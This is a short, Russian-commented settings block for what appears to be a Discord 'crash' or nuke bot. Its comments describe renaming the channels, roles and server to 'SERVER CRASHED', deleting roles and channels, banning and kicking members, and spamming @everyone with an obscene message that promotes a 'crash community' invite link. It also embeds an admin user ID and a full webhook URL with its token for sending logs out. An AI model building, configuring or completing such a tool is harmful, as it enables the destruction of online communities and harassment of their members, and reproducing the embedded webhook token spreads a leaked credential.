...
# подробные настройки
channelsn = 'SERVER CHASHED' #имя каналов при краше
rolesn = 'SERVER CRASHED'#имя ролей при краше
namen = 'SERVER CRASHED'#имя сервера при краше
iconn = 'icon.PNG' # не трогайте лучше
hooknamen = 'SERVER CRASHED'#имя хуков
botnamen = ''#тип имя бота
inviten = 'discord.gg/9UMpKxwnpH' # тут ссылка на ваш сервер
spamtextn = f'@everyone\nВАШ СЕРВЕР ЕБЁТ muxedcrash community {inviten}'
admins = [1189949692256211117] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
reasonn = 'SERVER CHASHED' # причина удаления ролей,каналов, бана и кика участников
loghook = 'https://discord.com/api/webhooks/1393578731402039356/dfr_xBrXDrcJgBNaDZN5j_4aK6y4qLsUnxVMgY90o3QB_UHXRvbiG1m14B7TSs_Hadru'# ссылка на вебхук с логами
